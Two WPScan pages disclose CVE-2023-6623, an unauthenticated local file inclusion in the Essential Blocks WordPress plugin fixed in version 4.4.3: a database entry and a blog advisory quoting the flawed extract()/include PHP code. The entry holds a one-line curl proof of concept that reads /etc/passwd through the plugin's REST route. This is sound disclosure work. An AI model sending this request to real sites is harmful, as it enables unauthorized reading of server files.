=== Content from wpscan.com_a4f96c15_20250114_184558.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Essential Blocks < 4.4.3 - Unauthenticated Local File Inclusion

### Description

The plugin does not prevent unauthenticated attackers from overwriting local variables when rendering templates over the REST API, which may lead to Local File Inclusion attacks.

### Proof of Concept

curl --url 'http://vulnerable-site.tld/wp-json/essential-blocks/v1/queries?block\_type=nonexisting\_block&query\_data=%7B%22source%22%3A+%22post%22%7D&attributes=%7B%22\_\_file%22%3A+%22%2Fetc%2Fpasswd%22%7D'

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

essential-blocks](https://a8cteam5105.wordpress.com/plugin/essential-blocks/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.4.3

### References

CVE
[CVE-2023-6623](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6623)

URL
<https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/>

### Classification

Type
LFI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-22](https://cwe.mitre.org/data/definitions/22.html)

CVSS
[9.0 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Marc Montpas

Submitter
Marc Montpas

Submitter website
<https://wpscan.com>

Submitter twitter
[marcS0H](//twitter.com/marcS0H)

Verified
Yes

WPVDB ID
[633c28e0-0c9e-4e68-9424-55c32789b41f](https://a8cteam5105.wordpress.com/vulnerability/633c28e0-0c9e-4e68-9424-55c32789b41f/)

### Timeline

Publicly Published
2023-12-21 (about 1 years ago)

Added
2023-12-21 (about 1 years ago)

Last Updated
2023-12-21 (about 1 years ago)

### Other

Published
Title

Published
2014-08-01
Title
[Myflash - myextractXML.php path Parameter Arbitrary File Access](https://a8cteam5105.wordpress.com/vulnerability/0447f906-7134-4a81-8da7-6a522b2dd99d/)

Published
2014-12-08
Title
[Ajax Store Locator <= 1.2 - Arbitrary File Download](https://a8cteam5105.wordpress.com/vulnerability/cd92fc31-4b7a-4dd6-9ab6-ab012b70b5ed/)

Published
2023-06-12
Title
[ND Shortcodes < 7.0 - Subscriber+ LFI](https://a8cteam5105.wordpress.com/vulnerability/0805ed7e-395d-48de-b484-6c3ec1cd4b8e/)

Published
2023-12-26
Title
[Ultimate Addons for Beaver Builder < 1.35.14 - Contributor+ Arbitrary File Download](https://a8cteam5105.wordpress.com/vulnerability/b5d3b7b9-b916-4ef9-9e24-bb47fedee23d/)

Published
2024-10-11
Title
[WordPress File Upload < 4.24.12 - Unauthenticated Path Traversal to Arbitrary File Read and Deletion in wfu\_file\_downloader.php](https://a8cteam5105.wordpress.com/vulnerability/2c820bda-9849-450e-b181-1bd4975431d6/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from wpscan.com_bb91b222_20250114_184557.html ===


* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

Updated on February 21, 2024December 21, 2023
# File Inclusion Vulnerability Fixed In Essential Blocks 4.4.3

During an analysis of [the Essential Blocks plugin](https://wordpress.org/plugins/essential-blocks/), we discovered a pretty serious Local File Inclusion vulnerability that can be exploited by any attackers, regardless of whether they have an account on the site.

When successfully exploited, this vulnerability may let attackers include arbitrary files hosted on the server to be parsed and executed as PHP files, which could potentially lead to Remote Code Execution on certain server configurations.

Upon identifying the vulnerability, we promptly alerted the authors of that plugin, who released version 4.4.3 to fix the issue. It is crucial for administrators of sites using this plugin to ensure it is fully updated to safeguard against this vulnerability.

## Unauthenticated Local File Inclusion

| Fixed Version | 4.4.3 |
| --- | --- |
| CVE-ID | [CVE-2023-6623](https://www.cve.org/CVERecord?id=CVE-2023-6623) |
| WPVDB ID | [633c28e0-0c9e-4e68-9424-55c32789b41f](https://wpscan.com/vulnerability/633c28e0-0c9e-4e68-9424-55c32789b41f/) |
| CVSSv3.1 | [9.0](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1) |

```

/**
         * Get views for front-end display
         *
         * @param string $name  it will be file name only from the view's folder.
         * @param array  $data
         * @return void
         */
        public static function views( $name, $data = [] ) {
            $__file = static::get_views_path( $name );
            $helper = static::class;

            extract( $data );
            if ( is_readable( $__file ) ) {
                include $__file;
            }
        }

```

The plugin’s template system uses the PHP extract() function to populate variables meant to be used in the later included templates. Unfortunately, it did not use the function’s optional EXTR\_SKIP flag to prevent it from overwriting already defined variables, such as the one holding the path to the template to include.

Unfortunately, the helper function in question was used with user input on a publicly accessible REST API route.

A proof of concept will be made available on the WPScan entry for this issue on January 4th, 2024.

**Timeline**

* 2023‑12‑08 – Details of the vulnerability sent to the Essential Blocks team
* 2023‑12‑18 – Patch released by the Essential Blocks team
* 2023‑12‑21- Advisory & Blog Post Released

**Credits**

Original research: Marc Montpas

Thanks to the rest of the WPScan team for feedback, help, and corrections.

### Share this:

* [Twitter](https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/?share=twitter "Click to share on Twitter")
* [Facebook](https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/?share=facebook "Click to share on Facebook")
Like Loading…
## Posted by

![](https://0.gravatar.com/avatar/6fc96ab17c597fba35b3e50fdac0963304b08d097a3cb8c7a12b5aab370ca908?s=48&d=identicon&r=G)

[Marc Montpas](https://wpscan.com/blog/author/marcs0h/)

## Get News and Tips From WPScan

Type your email…

Subscribe

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Reblog
* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Ffile-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Ffile-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3%252F)
  + [Copy shortlink](https://wp.me/pf0jyo-SR)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/)
  + [View post in Reader](https://wordpress.com/read/blogs/221720208/posts/3401)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)

